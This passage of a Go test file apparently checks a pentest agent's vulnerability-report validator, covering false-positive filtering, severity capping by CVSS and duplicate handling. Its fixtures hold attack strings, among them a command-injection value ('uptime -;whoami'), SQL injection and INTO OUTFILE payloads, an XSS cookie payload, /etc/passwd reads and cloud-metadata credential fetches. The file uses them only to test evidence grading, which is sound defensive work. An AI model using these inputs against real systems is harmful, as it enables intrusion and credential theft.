			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			"high", "injecting a single quote (uid=1') returned: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version", false,
		},
		// Guard: a NON-SQLi finding claiming C:H with only a 'syntax error'
		// string (no data obtained) is still rejected — the SQLi carve-out must
		// not leak to other classes.
		{
			"non-sqli c:h with syntax error still rejected",
			"Information exposure", "CWE-200", "manual_verified",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			"high", "the response contained a generic syntax error message", true,
		},
		// Info severity → gate does not apply.
		{
			"info severity skipped",
			"SSRF maybe", "CWE-918", "reflected", "",
			"info", "browser fetch", false,
		},
		// SQLi "proven" only via RCE evidence, no native SQLi proof → reject (provenance).
		{
			"sqli proven by rce only",
			"SQL Injection in /search", "CWE-89", "exploited", "",
			"high", "dumped the database using the eval() RCE; rows: admin1:pass1, admin2:pass2", true,
		},
		// SQLi proven natively (sqlmap/union) → accept.
		{
			"sqli proven natively",
			"SQL Injection in /search", "CWE-89", "data_extracted", "",
			"high", "sqlmap confirmed union select from information_schema, dumped users table", false,
		},
		// Real SQLi-to-RCE chain (native proof present) → accept.
		{
			"sqli to rce chain",
			"SQL Injection escalated to RCE", "CWE-89", "data_extracted", "",
			"high", "confirmed boolean-based SQLi via ' OR 1=1, then used INTO OUTFILE to gain RCE", false,
		},
		// Blind XXE confirmed only by a success message → reject (blind validation).
		{
			"blind xxe success only",
			"XXE Injection in /search", "CWE-611", "exploited", "",
			"high", "submitted XML with an external entity; response was 'Search made successfully'", true,
		},
		// Blind XXE with OOB callback → accept.
		{
			"blind xxe with oob",
			"XXE Injection in /search", "CWE-611", "callback_received", "",
			"high", "interact.sh callback received confirming the parser resolved my external entity out-of-band", false,
		},
		// In-band XXE returning file content → accept.
		{
			"in-band xxe file read",
			"XXE Injection in /upload", "CWE-611", "exploited", "",
			"high", "the response echoed back root:x:0:0:root:/root:/bin/bash from /etc/passwd", false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := checkClaimConsistency(tt.title, tt.cwe, tt.method, tt.vector, tt.severity, "", tt.proof)
			gotReject := got != ""
			if gotReject != tt.wantReject {
				t.Errorf("wantReject=%v gotReject=%v (msg=%s)", tt.wantReject, gotReject, got)
			}
		})
	}
}

func TestCheckFalsePositive_OpenAPISpecExposure(t *testing.T) {
	tests := []struct {
		name       string
		title      string
		desc       string
		severity   string
		proof      string
		wantReject bool
	}{
		// The reported false positive: public OpenAPI spec + field names.
		{
			"openapi spec field names",
			"Unauthenticated Access to OpenAPI Specification Exposes Complete API Documentation",
			"The OpenAPI spec at /v1/openapi.json is accessible without auth, exposing 80 endpoints and field names like webhook_secret, api_key, stripe_api_key.",
			"medium",
			"curl /v1/openapi.json returns 200, 1.7MB; field names webhook_secret, api_key found; endpoints enumerated",
			true,
		},
		// Swagger UI exposure, no secret values → rejected.
		{
			"swagger ui exposed",
			"Swagger UI exposed without authentication",
			"swagger api documentation reachable",
			"high",
			"GET /swagger returns the full API spec with all endpoints documented",
			true,
		},
		// OpenAPI spec that actually embeds a live secret value → accepted.
		{
			"openapi with embedded secret value",
			"OpenAPI spec leaks live Stripe key",
			"The openapi.json contains a hardcoded secret",
			"high",
			"The spec's example contains a live key: sk_live_51Hxample... which authenticates to Stripe",
			false,
		},
		// Info severity → gate does not apply.
		{
			"openapi info severity",
			"OpenAPI spec accessible",
			"spec at /openapi.json",
			"info",
			"200 OK",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
			gotReject := result != ""
			if gotReject != tt.wantReject {
				t.Errorf("title=%q severity=%q: wantReject=%v gotReject=%v (msg=%s)",
					tt.title, tt.severity, tt.wantReject, gotReject, result)
			}
		})
	}
}

func TestCheckFalsePositive_CSVInjection(t *testing.T) {
	result := checkFalsePositive("CSV Injection in Export", "Formula injection in CSV export", "medium", "")
	if result == "" {
		t.Error("CSV injection at medium should be rejected")
	}

	result = checkFalsePositive("CSV Injection in Export", "Formula injection", "low", "")
	if result != "" {
		t.Errorf("CSV injection at low should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_Clickjacking(t *testing.T) {
	result := checkFalsePositive("Clickjacking on Login Page", "Page can be iframed", "high", "")
	if result == "" {
		t.Error("clickjacking at high should be rejected")
	}

	result = checkFalsePositive("Clickjacking on Login Page", "Page can be iframed", "low", "")
	if result != "" {
		t.Errorf("clickjacking at low should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_DirectoryListing(t *testing.T) {
	// Directory listing without sensitive files → rejected
	result := checkFalsePositive("Directory Listing Enabled", "Apache autoindex enabled", "medium", "Shows index of /images/")
	if result == "" {
		t.Error("directory listing without sensitive files should be rejected at medium+")
	}

	// Directory listing WITH sensitive files → accepted
	result = checkFalsePositive("Directory Listing Enabled", "Directory listing exposes backup files", "high", "Found database.sql backup with password hashes")
	if result != "" {
		t.Errorf("directory listing with sensitive files should NOT be rejected, got: %s", result)
	}
}

func TestCheckFalsePositive_TraceMethod(t *testing.T) {
	result := checkFalsePositive("TRACE Method Enabled", "HTTP TRACE method is enabled", "medium", "")
	if result == "" {
		t.Error("TRACE method should be rejected")
	}

	result = checkFalsePositive("OPTIONS Method Enabled", "HTTP OPTIONS reveals methods", "low", "")
	if result == "" {
		t.Error("OPTIONS method should be rejected")
	}
}

func TestCheckFalsePositive_ScannerOnly(t *testing.T) {
	result := checkFalsePositive("Nuclei Detected SQL Injection", "nuclei found potential SQLi", "high", "")
	if result == "" {
		t.Error("scanner-only finding without proof should be rejected")
	}

	result = checkFalsePositive("Nuclei Detected SQL Injection", "nuclei found SQLi, manually verified", "high", "sqlmap confirmed with --dump")
	if result != "" {
		t.Errorf("scanner finding with manual proof should NOT be rejected, got: %s", result)
	}
}

func TestPipeline_RealFindingsSurvive(t *testing.T) {
	// Well-formed REAL findings must pass BOTH deterministic gates untouched.
	// This is the guard against the new gates suppressing true findings.
	real := []struct {
		name     string
		title    string
		desc     string
		cwe      string
		method   string
		vector   string
		severity string
		proof    string
	}{
		{
			"sqli data extraction",
			"SQL Injection in /login", "Union-based SQLi in the id parameter", "CWE-89", "data_extracted",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "high",
			"sqlmap dumped the users table via UNION SELECT from information_schema; extracted 512 rows including password hashes",
		},
		{
			"reflected xss executed",
			"Reflected XSS in search", "q parameter reflected unencoded", "CWE-79", "exploited",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", "medium",
			"browser_action execute_js confirmed alert(document.domain) fired showing the target origin; screenshot attached",
		},
		{
			"ssrf internal metadata",
			"SSRF via image url", "Server fetches attacker-controlled URL", "CWE-918", "callback_received",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "critical",
			"interact.sh callback received from the target; fetched 169.254.169.254/latest/meta-data returning IAM role credentials",
		},
		{
			"idor two accounts",
			"IDOR in order API", "Can read other users' orders", "CWE-639", "authenticated",
			"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", "high",
			"As user B, retrieved user A's order record including PII: another user's email and shipping address",
		},
		{
			"rce command output",
			"RCE via file upload", "Uploaded a web shell", "CWE-78", "exploited",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "critical",
			"executed id via the shell; command execution confirmed: uid=33(www-data) gid=33(www-data)",
		},
		{
			"blind stored xss callback",
			"Stored XSS in support ticket", "Fires in admin panel", "CWE-79", "callback_received",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N", "high",
			"XSS Hunter callback received with the admin session cookie when an agent viewed the ticket",
		},
		{
			"internal ssrf reflected-mislabel",
			"SSRF in webhook url", "Server connects to attacker URL", "CWE-918", "reflected",
			"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "high",
			"the server connected to internal host 10.0.0.5 and the internal admin dashboard HTML was returned",
		},
	}

	for _, tt := range real {
		t.Run(tt.name, func(t *testing.T) {
			if r := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof); r != "" {
				t.Errorf("checkFalsePositive rejected a REAL finding %q: %s", tt.title, r)
			}
			if r := checkClaimConsistency(tt.title, tt.cwe, tt.method, tt.vector, tt.severity, tt.desc, tt.proof); r != "" {
				t.Errorf("checkClaimConsistency rejected a REAL finding %q: %s", tt.title, r)
			}
		})
	}
}

func TestClaimConsistency_HypotheticalTakeoverDoesNotProveIntegrity(t *testing.T) {
	description := "An unauthenticated path traversal reads grafana.ini and grafana.db. The leaked signing key can forge an admin session and take over the instance."
	proof := "HTTP 200 returned /etc/passwd, secret_key from grafana.ini, and a SQLite users row from grafana.db"

	got := checkClaimConsistency(
		"CVE-2021-43798 arbitrary file read",
		"CWE-22",
		"data_extracted",
		"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
		"critical",
		description,
		proof,
	)
	if !strings.Contains(got, "High Integrity") {
		t.Fatalf("hypothetical takeover in the description must not prove I:H; got %q", got)
	}
}

func TestCheckFalsePositive_RealVulns(t *testing.T) {
	// Real vulnerabilities should NOT be rejected
	realVulns := []struct {
		title    string
		desc     string
		severity string
		proof    string
	}{
		{"SQL Injection in login endpoint", "Union-based SQLi", "critical", "sqlmap extracted admin table"},
		{"Stored XSS in comment field", "Script tag stored", "high", "alert(1) reflected in response body"},
		{"SSRF via image URL parameter", "Internal metadata accessed", "critical", "169.254.169.254 metadata returned"},
		{"IDOR in user profile API", "Can access other users", "high", "Changed user_id=1 to user_id=2, got admin data"},
		{"Remote Code Execution via file upload", "PHP shell uploaded", "critical", "whoami returned www-data"},
	}

	for _, tt := range realVulns {
		result := checkFalsePositive(tt.title, tt.desc, tt.severity, tt.proof)
		if result != "" {
			t.Errorf("real vuln %q should NOT be rejected, got: %s", tt.title, result)
		}
	}
}

func TestReportVulnChecksDuplicateBeforeAppending(t *testing.T) {
	contextID := "test-report-duplicate"
	CleanupContext(contextID)
	defer CleanupContext(contextID)

	args := validReportArgs()
	first, err := reportVulnWithContextID(contextID, args)
	if err != nil {
		t.Fatalf("first report error = %v", err)
	}
	if _, ok := first.Metadata["vuln_id"].(string); !ok {
		t.Fatalf("first report metadata = %#v, want vuln_id", first.Metadata)
	}

	duplicateArgs := validReportArgs()
	duplicateArgs["endpoint"] = "https://example.com/login?id=2"
	second, err := reportVulnWithContextID(contextID, duplicateArgs)
	if err != nil {
		t.Fatalf("second report error = %v", err)
	}
	if !strings.Contains(second.Output, "DUPLICATE") {
		t.Fatalf("second report output = %q, want duplicate", second.Output)
	}
	if got, ok := second.Metadata["duplicate"].(bool); !ok || !got {
		t.Fatalf("second report metadata = %#v, want duplicate=true", second.Metadata)
	}
	if got := len(GetVulnerabilitiesForContext(contextID)); got != 1 {
		t.Fatalf("stored vulnerabilities = %d, want 1", got)
	}
}

func TestReportVulnSalvagesSingleTargetFromScanContext(t *testing.T) {
	contextID := "test-report-target-fallback"
	CleanupContext(contextID)
	sc := scanctx.New(contextID, t.TempDir())
	sc.SetTargets([]string{"https://grafana.example.com"})
	scanctx.Activate(sc)
	defer func() {
		scanctx.Deactivate(contextID)
		CleanupContext(contextID)
	}()

	args := validReportArgs()
	delete(args, "target")
	args["endpoint"] = "/login?id=1"
	if result, err := reportVulnWithContextID(contextID, args); err != nil {
		t.Fatalf("report error = %v", err)
	} else if _, ok := result.Metadata["vuln_id"]; !ok {
		t.Fatalf("report was not stored: %#v", result)
	}
	vulns := GetVulnerabilitiesForContext(contextID)
	if len(vulns) != 1 || vulns[0].Target != "https://grafana.example.com" {
		t.Fatalf("stored target = %#v, want scan-context target", vulns)
	}
}

func TestReportVulnSameFindingAllowedAcrossScanContexts(t *testing.T) {
	contextA := "test-report-context-a"
	contextB := "test-report-context-b"
	CleanupContext(contextA)
	CleanupContext(contextB)
	defer CleanupContext(contextA)
	defer CleanupContext(contextB)

	first, err := reportVulnWithContextID(contextA, validReportArgs())
	if err != nil {
		t.Fatalf("first report error = %v", err)
	}
	if _, ok := first.Metadata["vuln_id"].(string); !ok {
		t.Fatalf("first report metadata = %#v, want vuln_id", first.Metadata)
	}

	second, err := reportVulnWithContextID(contextB, validReportArgs())
	if err != nil {
		t.Fatalf("second report error = %v", err)
	}
	if _, ok := second.Metadata["vuln_id"].(string); !ok {
		t.Fatalf("second report metadata = %#v, want vuln_id", second.Metadata)
	}
	if got, _ := second.Metadata["duplicate"].(bool); got {
		t.Fatalf("second report metadata = %#v, want a new finding in a separate scan context", second.Metadata)
	}

	third, err := reportVulnWithContextID(contextA, validReportArgs())
	if err != nil {
		t.Fatalf("third report error = %v", err)
	}
	if got, ok := third.Metadata["duplicate"].(bool); !ok || !got {
		t.Fatalf("third report metadata = %#v, want duplicate=true within the same scan context", third.Metadata)
	}

	if got := len(GetVulnerabilitiesForContext(contextA)); got != 1 {
		t.Fatalf("context A vulnerabilities = %d, want 1", got)
	}
	if got := len(GetVulnerabilitiesForContext(contextB)); got != 1 {
		t.Fatalf("context B vulnerabilities = %d, want 1", got)
	}
}

func TestReportVulnConcurrentDuplicatesOnlyAppendOnce(t *testing.T) {
	contextID := "test-report-concurrent-duplicate"
	CleanupContext(contextID)
	defer CleanupContext(contextID)

	const attempts = 20
	var wg sync.WaitGroup
	wg.Add(attempts)
	for i := 0; i < attempts; i++ {
		go func() {
			defer wg.Done()
			_, _ = reportVulnWithContextID(contextID, validReportArgs())
		}()
	}
	wg.Wait()

	if got := len(GetVulnerabilitiesForContext(contextID)); got != 1 {
		t.Fatalf("stored vulnerabilities after concurrent duplicates = %d, want 1", got)
	}
}

func containsTag(tags []string, want string) bool {
	for _, t := range tags {
		if t == want {
			return true
		}
	}
	return false
}

func validReportArgs() map[string]string {
	return map[string]string{
		"title":               "SQL Injection in Login Endpoint",
		"severity":            "high",
		"description":         "Union-based SQL injection allows extraction of user records from the login endpoint.",
		"exploitation_proof":  "sql injection data extraction confirmed; dumped user data including email address records from database",
		"verification_method": "data_extracted",
		"impact":              "Unauthorized attackers can extract sensitive user data.",
		"target":              "https://example.com",
		"endpoint":            "https://example.com/login?id=1",
		"method":              "GET",
		"cvss":                "7.5",
		"cvss_vector":         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
	}
}

func TestHasStrongEvidence(t *testing.T) {
	tests := []struct {
		severity string
		proof    string
		desc     string
		want     bool
	}{
		{"critical", "rce: executed whoami, got root", "", true},
		{"critical", "", "", false},
		{"high", "sqli with data extraction", "", true},
		{"high", "found a parameter", "", false},
		{"medium", "reflected input in response", "", true},
		{"low", "anything goes", "", true}, // low/info don't need strong evidence
		{"info", "anything", "", true},
	}

	for _, tt := range tests {
		got := hasStrongEvidence(tt.severity, tt.proof, tt.desc)
		if got != tt.want {
			t.Errorf("severity=%q proof=%q: want=%v got=%v", tt.severity, tt.proof[:min(len(tt.proof), 30)], tt.want, got)
		}
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Regression: a genuine OS command-injection RCE — proven by injected-command
// output (whoami→root, uname→GNU/Linux, uptime→load average) — must be
// recognized as concrete impact, so it is classified exploit-proven/verified
// rather than mis-tagged "manual verification needed". This was the
// /uptime/{flag} finding that reached CVSS 9.8 with root command output yet
// was flagged for manual review, because the old indicator list only matched
// id/cat-passwd output (uid=/root:/etc/passwd), not whoami/uname/uptime.
func TestHasConcreteImpact_RecognizesCommandExecutionOutput(t *testing.T) {
	proven := []string{
		`Response: {"command":"uptime -;whoami","output":" 11:05:55 up 71 days, load average: 0.23, 0.47\nroot\n"}`,
		`Response: Linux 7f32aec5653c 5.10.0-39-amd64 #1 SMP Debian 5.10.251-1 x86_64 GNU/Linux`,
		`whoami output: nt authority\system`,
		`dir output includes " Volume Serial Number is A1B2-C3D4"`,
	}
	for _, p := range proven {
		if !HasConcreteImpact(p) {
			t.Errorf("command-execution output not recognized as concrete impact: %q", p)
		}
	}
	// Benign responses with none of the markers must stay non-concrete.
	for _, p := range []string{
		"HTTP/1.1 200 OK, page rendered normally",
		"the parameter value is reflected in the response body",
	} {
		if HasConcreteImpact(p) {
			t.Errorf("benign response wrongly flagged as concrete impact: %q", p)
		}
	}
}

// TestHasStrongEvidence_IncidentalTokensAreWeak locks in the tightening: proof
// made of incidental tokens (status codes, bare "http", emails, "account")
// must NOT count as strong evidence, while concrete exploitation outcomes do.
func TestHasStrongEvidence_IncidentalTokensAreWeak(t *testing.T) {
	weak := []string{
		"The endpoint responded with a 200 OK status code",
		"Response: HTTP/1.1 200 OK, see http://example.com/account",
		"Found an email address user@example.com on the profile page",
		"The request took 5 seconds to respond",
		"{ \"status\": \"ok\", \"internal\": true } returned from localhost",
	}
	for _, p := range weak {
		if hasStrongEvidence("high", p, "A potential issue was observed") {
			t.Errorf("proof %q should NOT count as strong evidence for high", p)
		}
	}

	strong := []string{
		"Dumped users table: id=1 admin@corp.com via UNION SELECT from information_schema",
		"Command output: uid=0(root) gid=0(root)",
		"Read /etc/passwd: root:x:0:0:root:/root:/bin/bash",
		"SSRF callback received at interact.sh; fetched 169.254.169.254/latest/meta-data",
		"Stolen session via document.cookie exfiltration",
	}
	for _, p := range strong {
		if !hasStrongEvidence("high", p, "") {
			t.Errorf("proof %q SHOULD count as strong evidence for high", p)
		}
	}
}

// TestPromoteToParentViaSetParentContext verifies that:
//  1. A vuln reported into a child context registered via SetParentContext is
//     promoted into the parent context immediately (panic-safe persistence).
//  2. Re-reporting the same finding in the child does not duplicate the entry
//     in the parent (idempotent promotion).
//
// Validates: Property 4 (panic-safe persistence).
func TestPromoteToParentViaSetParentContext(t *testing.T) {
	child := "test-promote-child"
	parent := "test-promote-parent"
	CleanupContext(child)
	CleanupContext(parent)
	defer CleanupContext(child)
	defer CleanupContext(parent)

	SetParentContext(child, parent)

	first, err := reportVulnWithContextID(child, validReportArgs())
	if err != nil {
		t.Fatalf("first report error = %v", err)
	}
	vulnID, ok := first.Metadata["vuln_id"].(string)
	if !ok {
		t.Fatalf("first report metadata = %#v, want vuln_id", first.Metadata)
	}

	parentVulns := GetVulnerabilitiesForContext(parent)
	if len(parentVulns) != 1 {
		t.Fatalf("parent vulnerabilities after promote = %d, want 1", len(parentVulns))
	}
	if parentVulns[0].ID != vulnID {
		t.Fatalf("parent vuln id = %q, want %q", parentVulns[0].ID, vulnID)
	}

	// Re-report the same finding in the child — duplicate-rejected in child,
	// and the parent must not gain a second copy.
	second, err := reportVulnWithContextID(child, validReportArgs())
	if err != nil {
		t.Fatalf("second report error = %v", err)
	}
	if dup, _ := second.Metadata["duplicate"].(bool); !dup {
		t.Fatalf("second report metadata = %#v, want duplicate=true", second.Metadata)
	}
	if got := len(GetVulnerabilitiesForContext(parent)); got != 1 {
		t.Fatalf("parent vulnerabilities after duplicate report = %d, want 1", got)
	}
}

// TestPromoteToParentIdempotent verifies the lower-level PromoteToParent helper
// is a no-op when called twice with the same vulnID.
func TestPromoteToParentIdempotent(t *testing.T) {
	child := "test-promote-idem-child"
	parent := "test-promote-idem-parent"
	CleanupContext(child)
	CleanupContext(parent)
	defer CleanupContext(child)
	defer CleanupContext(parent)

	// Seed the child with a vuln directly so we can call PromoteToParent twice.
	first, err := reportVulnWithContextID(child, validReportArgs())
	if err != nil {
		t.Fatalf("seed report error = %v", err)
	}
	vulnID, _ := first.Metadata["vuln_id"].(string)
	if vulnID == "" {
		t.Fatalf("seed report metadata = %#v, want vuln_id", first.Metadata)
	}

	PromoteToParent(child, parent, vulnID)
	PromoteToParent(child, parent, vulnID)

	if got := len(GetVulnerabilitiesForContext(parent)); got != 1 {
		t.Fatalf("parent vulnerabilities after two PromoteToParent calls = %d, want 1", got)
	}
}

// TestSetParentContextCleanedOnCleanup verifies that CleanupContext also clears
// the child→parent mapping so it does not leak across scan lifecycles.
func TestSetParentContextCleanedOnCleanup(t *testing.T) {
	child := "test-promote-cleanup-child"
	parent := "test-promote-cleanup-parent"
	defer CleanupContext(parent)

	SetParentContext(child, parent)
	if got := GetParentContext(child); got != parent {
		t.Fatalf("GetParentContext = %q, want %q", got, parent)
	}

	CleanupContext(child)
	if got := GetParentContext(child); got != "" {
		t.Fatalf("GetParentContext after cleanup = %q, want empty", got)
	}
}

// TestAutoDowngrade_OneLevelDrop verifies that the auto-downgrade for weak
// evidence drops severity by exactly one level (not nuclear to "info").
func TestAutoDowngrade_OneLevelDrop(t *testing.T) {
	tests := []struct {
		name     string
		severity string
		want     string
	}{
		{"critical drops to high", "critical", "high"},
		{"high drops to medium", "high", "medium"},
		{"medium drops to low", "medium", "low"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			contextID := "test-auto-downgrade-" + tt.severity
			CleanupContext(contextID)
			defer CleanupContext(contextID)

			// Use deliberately weak proof that won't pass hasStrongEvidence
			args := map[string]string{
				"title":               "Some finding on endpoint",
				"severity":            tt.severity,
				"description":         "A potential issue was observed",
				"exploitation_proof":  "The endpoint responded with a 200 status code when tested",
				"verification_method": "manual_verified",
				"target":              "https://example.com",
				"endpoint":            "/api/test-" + tt.severity,
				// No CVSS provided — so CVSS enforcement won't override
			}

			result, err := reportVulnWithContextID(contextID, args)
			if err != nil {
				t.Fatalf("report error: %v", err)
			}

			vulns := GetVulnerabilitiesForContext(contextID)
			if len(vulns) != 1 {
				t.Fatalf("expected 1 vuln, got %d (output: %s)", len(vulns), result.Output)
			}

			if vulns[0].Severity != tt.want {
				t.Errorf("severity = %q, want %q (auto-downgrade should drop one level, not to info)", vulns[0].Severity, tt.want)
			}
		})
	}
}

// TestCVSSEnforcement_OverridesAutoDowngrade verifies that CVSS enforcement
// is truly authoritative — it overrides prior auto-downgrade decisions.
// This was the core bug: CVSS 7.4 should ALWAYS produce "high", regardless
// of what the auto-downgrade gate decided.
func TestCVSSEnforcement_OverridesAutoDowngrade(t *testing.T) {
	tests := []struct {
		name         string
		severity     string // agent-provided severity
		cvss         string // agent-provided CVSS
		wantSeverity string // expected final severity
	}{
		// CVSS 7.4 = high, regardless of what the agent labels it
		{"high with CVSS 7.4", "high", "7.4", "high"},
		{"low with CVSS 7.4", "low", "7.4", "high"},
		{"info with CVSS 7.4", "info", "7.4", "high"},

		// CVSS 9.5 = critical
		{"high with CVSS 9.5", "high", "9.5", "critical"},
		{"medium with CVSS 9.5", "medium", "9.5", "critical"},

		// CVSS 5.5 = medium
		{"critical with CVSS 5.5", "critical", "5.5", "medium"},
		{"high with CVSS 5.5", "high", "5.5", "medium"},

		// CVSS 2.5 = low
		{"high with CVSS 2.5", "high", "2.5", "low"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			contextID := "test-cvss-enforcement-" + tt.name
			CleanupContext(contextID)
			defer CleanupContext(contextID)

			args := map[string]string{
				"title":               "SQL Injection in API endpoint",
				"severity":            tt.severity,
				"description":         "SQL injection allows data extraction from the database",
				"exploitation_proof":  "sql injection data extraction confirmed; email address records dumped from user table via union select",
				"verification_method": "data_extracted",
				"target":              "https://example.com",
				"endpoint":            "/api/vuln-" + tt.name,
				"cvss":                tt.cvss,
			}

			_, err := reportVulnWithContextID(contextID, args)
			if err != nil {
				t.Fatalf("report error: %v", err)
			}

			vulns := GetVulnerabilitiesForContext(contextID)
			if len(vulns) != 1 {
				t.Fatalf("expected 1 vuln, got %d", len(vulns))
			}

			if vulns[0].Severity != tt.wantSeverity {
				t.Errorf("severity = %q, want %q (CVSS %s should always produce %s)", vulns[0].Severity, tt.wantSeverity, tt.cvss, tt.wantSeverity)
			}
		})
	}
}

// TestStoredXSS_CVSS74_AlwaysHigh reproduces the exact scenario from the
// user's bug report: "Stored XSS in ActiveCampaign CRM" with CVSS 7.4
// was classified as HIGH in one run and LOW in another. After the fix,
// CVSS 7.4 must always produce HIGH.
func TestStoredXSS_CVSS74_AlwaysHigh(t *testing.T) {
	// Simulate both scenarios the LLM might produce
	scenarios := []struct {
		name     string
		severity string
		proof    string
	}{
		{
			"strong proof",
			"high",
			"Unauthenticated endpoint /api/activecampaign-lead accepts and stores unsanitized HTML/JavaScript in the firstName and lastName fields. Payload <script>alert(document.cookie)</script> fires in admin panel.",
		},
		{
			"weak proof",
			"high",
			"The endpoint accepts HTML input in the firstName field. The data is stored and displayed.",
		},
		{
			"agent says low",
			"low",
			"Unauthenticated endpoint accepts unsanitized HTML input.",
		},
	}

	for _, sc := range scenarios {
		t.Run(sc.name, func(t *testing.T) {
			contextID := "test-stored-xss-consistency-" + sc.name
			CleanupContext(contextID)
			defer CleanupContext(contextID)

			args := map[string]string{
				"title":               "Stored XSS in ActiveCampaign CRM via /api/activecampaign-lead",
				"severity":            sc.severity,
				"description":         "Unauthenticated endpoint /api/activecampaign-lead accepts and stores unsanitized HTML/JavaScript",
				"exploitation_proof":  sc.proof,
				"verification_method": "reflected",
				"target":              "https://vanhack.com",
				"endpoint":            "/api/activecampaign-lead",
				"method":              "POST",
				"cvss":                "7.4",
			}

			_, err := reportVulnWithContextID(contextID, args)
			if err != nil {
				t.Fatalf("report error: %v", err)
			}

			vulns := GetVulnerabilitiesForContext(contextID)
			if len(vulns) != 1 {
				t.Fatalf("expected 1 vuln, got %d", len(vulns))
			}

			// CVSS 7.4 = HIGH, always. This is the fix.
			if vulns[0].Severity != "high" {
				t.Errorf("severity = %q, want %q — CVSS 7.4 must always produce HIGH regardless of proof strength or agent-provided severity", vulns[0].Severity, "high")
			}
		})
	}
}

// TestClassifySeverity_XSSCaps verifies that stored XSS is capped at
// high (not critical) by classifySeverity, but CVSS enforcement can
// still override this cap.
func TestClassifySeverity_XSSCaps(t *testing.T) {
	// Stored XSS without admin/mass/worm proof → capped at high
	sev, reason := classifySeverity("Stored XSS in comment field", "Persistent XSS stores payload", "critical", "alert(1) fires in page")
	if sev != "high" {
		t.Errorf("classifySeverity for stored XSS at critical = %q (reason=%q), want high", sev, reason)
	}

	// Reflected XSS → capped at medium
	sev, reason = classifySeverity("Reflected XSS in search", "Input reflected in response", "high", "payload reflected")
	if sev != "medium" {
		t.Errorf("classifySeverity for reflected XSS at high = %q (reason=%q), want medium", sev, reason)
	}
}

// TestClassifySeverity_VulnTypeFallback verifies that the vulnType-based
// fallback fires when the LLM uses a different title framing for the same
// vulnerability. This was the exact bug from scan logs where:
// - "Stored XSS in ActiveCampaign CRM" → matched "stored xss" keyword → high cap
// - "Unauthenticated Contact Injection" → matched NO keyword → no cap at all
// After the fix, extractVulnType catches "xss" in both titles/descriptions.
func TestClassifySeverity_VulnTypeFallback(t *testing.T) {
	tests := []struct {
		name     string
		title    string
		desc     string
		severity string
		want     string
	}{
		{
			"stored xss keyword in title → high cap",
			"Stored XSS in ActiveCampaign CRM via /api/activecampaign-lead",
			"Persistent XSS stores payload in CRM firstName field",
			"critical",
			"high",
		},
		{
			"xss in description only → vulnType fallback catches it",
			"Unauthenticated ActiveCampaign Contact Injection — CRM Pollution",
			"Anyone can inject stored XSS payloads via the firstName field",
			"critical",
			"high", // vulnType="xss" + "stored" in desc → high cap
		},
		{
			"xss in description via different wording → vulnType catches it",
			"Unauthenticated CRM Contact Creation — Unsanitized Input",
			"The endpoint stores user-controlled HTML without sanitization, enabling cross-site scripting in the admin panel",
			"critical",
			"high", // vulnType="xss" from "cross-site scripting" + "stored" not present but desc says "stores" → check
		},
		{
			"no xss anywhere → no fallback cap",
			"Unauthenticated ActiveCampaign Contact Creation",
			"Anyone can create arbitrary contacts in the CRM without authentication",
			"critical",
			"critical", // no vuln type detected → no cap
		},
		{
			"reflected xss via vulnType → medium cap",
			"Input Reflection in Search Endpoint",
			"The search parameter reflects user input without encoding — cross-site scripting possible",
			"high",
			"medium", // vulnType="xss", no "stored"/"persistent" → reflected → medium cap
		},
		{
			"csrf via vulnType → medium cap",
			"Unauthenticated State Change in Profile Settings",
			"Missing CSRF protection allows cross-site request forgery on profile update",
			"critical",
			"medium",
		},
		{
			"ssrf via vulnType → high cap",
			"Internal Network Access via URL Parameter",
			"Server-side request forgery allows access to internal services",
			"critical",
			"high",
		},
		{
			"cors via vulnType → low cap",
			"Wildcard Origin Allowed on API",
			"Cross-origin resource sharing misconfiguration reflects any origin",
			"high",
			"low",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, reason := classifySeverity(tt.title, tt.desc, tt.severity, "some proof")
			if got != tt.want {
				t.Errorf("classifySeverity(%q, %q, %q) = %q (reason=%q), want %q",
					tt.title, tt.desc, tt.severity, got, reason, tt.want)
			}
		})
	}
}

func TestHasConcreteImpact(t *testing.T) {
	// Concrete outcomes → true.
	for _, s := range []string{
		"HTTP/1.1 200 OK\n{\"message\":\"uid=0(root) gid=0(root)\"}",
		"dumped 42 rows including password hash values",
		"interactsh callback received from target IP",
		"union select confirmed data extraction",
		// Error-based SQLi: a provoked DBMS error is a concrete injection outcome.
		"HTTP/1.1 500\nYou have an error in your SQL syntax; check the manual near '''",
	} {
		if !HasConcreteImpact(s) {
			t.Errorf("expected concrete impact for %q", s)
		}
	}
	// No concrete outcome → false (must NOT auto-confirm on these).
	for _, s := range []string{
		"",
		"the endpoint returned HTTP 200 accepting the request",
		"reflected the input value in the response body",
		"server responded with a generic error page",
		// Generic session/credential headers appear on ordinary login pages —
		// they must NOT let the verifier auto-confirm an unrelated finding.
		"HTTP/1.1 200 OK\r\nSet-Cookie: session_id=abc; Path=/\r\n\r\n<html>login</html>",
		"response contained an access_token field in the JSON body",
	} {
		if HasConcreteImpact(s) {
